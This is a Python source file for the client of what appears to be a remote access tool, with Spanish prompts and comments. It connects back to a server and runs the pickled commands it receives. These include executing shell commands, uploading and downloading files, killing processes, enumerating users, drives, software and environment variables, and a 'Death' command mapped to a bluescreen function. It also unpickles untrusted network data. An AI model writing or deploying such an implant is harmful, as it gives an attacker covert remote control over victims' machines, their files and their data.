import pickle
import socket
from . import functions as f
from client.setup import ClientSetup


class Client:
    def __init__(self, host=None, port=None, client_socket=None):
        self.host = host
        self.port = port
        self.setup = ClientSetup(__name__)
        self.client_socket = client_socket
        self.status_message = ""

        # Define command arguments and corresponding prompts
        self.command_args = {
            "kill": ["pid", "Ingrese el PID del proceso a terminar: "],
            "files": ["path", "Ingrese la ruta a listar (Enter para actual): "],
            "shell": ["command", "Ingrese el comando a ejecutar: "],
            "download": ["remote_path", "Ingrese la ruta del archivo remoto: "],
            "upload": ["local_path", "Ingrese la ruta del archivo local: "],
        }

        # Define commands and their associated functions
        self.commands = {
            "hostname": f.get_hostname,
            "ip": f.get_ip,
            "os": f.get_os,
            "Death": f.bluescreen,
            "users": f.get_users,
            "processes": f.get_processes,
            "drives": f.get_drives,
            "files": f.get_files,
            "download": f.download_file,
            "upload": f.upload_file,
            "network": f.get_network,
            "services": f.get_services,
            "kill": f.kill_process,
            "shell": f.execute_shell,
            "system_info": f.get_system_info,
            "environment": f.get_environment,
            "installed_software": f.get_installed_software,
            "network_connections": f.get_network_connections,
            "Uninstall tool": self.setup.uninstall,
        }

    def listen_for_commands(self):
        try:
            print("[+] Escuchando comandos...")
            while True:
                # Recibir longitud del comando
                length_data = self.client_socket.recv(4)
                if not length_data:
                    break

                length = int.from_bytes(length_data, 'big')

                # Recibir comando completo
                command_data = b''
                while len(command_data) < length:
                    chunk = self.client_socket.recv(min(4096, length - len(command_data)))
                    if not chunk:
                        break
                    command_data += chunk

                if command_data:
                    command = pickle.loads(command_data)
                    print(f"Comando recibido: {command}")

                    # Ejecutar comando y obtener respuesta
                    response = self.execute_command(command)

                    # Serializar y enviar la respuesta
                    response_data = pickle.dumps(response)
                    # Enviar longitud primero
                    self.client_socket.sendall(len(response_data).to_bytes(4, 'big'))
                    # Enviar datos
                    self.client_socket.sendall(response_data)
                else:
                    break

        except Exception as e:
            print(f"Error al recibir comando: {e}")
        finally:
            self.client_socket.close()

    def connect(self):
        try:
            self.client_socket = socket.create_connection((self.host, self.port))

            # Enviar mensaje inicial
            initial_data = pickle.dumps({"status": "connected"})
            self.client_socket.sendall(len(initial_data).to_bytes(4, 'big'))
            self.client_socket.sendall(initial_data)

            self.status_message = "[+] Connected to the server."
            print(self.status_message)
            self.listen_for_commands()
            return True
        except Exception as e:
            self.status_message = f"[!] Error connecting to the server: {e}"
            return False

    def close(self):
        if self.client_socket:
            try:
                self.client_socket.close()
            except Exception as e:
                print(f"Error al cerrar conexión: {e}")
                pass
            self.client_socket = None
            self.status_message = "[-] Connection closed."

    def execute_command(self, command):
        # Aquí puedes procesar los comandos recibidos.
        try:
            if command in self.commands:
                return self.commands[command]()
            else:
                return f"Comando no válido: {command}"
        except Exception as e:
            return f"Error al ejecutar comando: {e}"
        # Por ejemplo, podrías usar 'os' para ejecutar comandos en el sistema.